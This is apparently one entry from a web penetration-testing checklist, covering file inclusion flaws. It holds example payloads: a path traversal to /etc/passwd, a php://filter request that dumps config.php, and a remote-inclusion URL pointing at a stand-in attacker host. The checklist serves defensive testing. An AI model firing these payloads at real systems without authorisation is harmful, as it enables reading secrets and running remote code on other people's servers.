- id: WEB-INJ-013
  sheet: WEB
  category: INJ
  title: Test file inclusion parameters for local and remote file inclusion
  objective: Finds include or require calls that build a path from user input without validation.
  preconditions:
  - Do not run on production.
  steps:
  - Find a parameter that selects a file to include or preview.
  - Submit a path traversal sequence to read a local file outside the intended directory.
  - Append a null byte or known truncation technique if an extension is appended server-side.
  - If outbound connections are allowed, submit a URL to test remote file inclusion.
  - Test PHP wrapper payloads such as php://filter and data:// if the backend is PHP.
  example: https://target/preview.php?file=../../../../etc/passwd ; php://filter/convert.base64-encode/resource=config.php ; https://target/vuln.php?file=https://attacker/malicious
  expected: File and URL parameters are resolved against an allowlist of safe paths with no path traversal or remote URL.
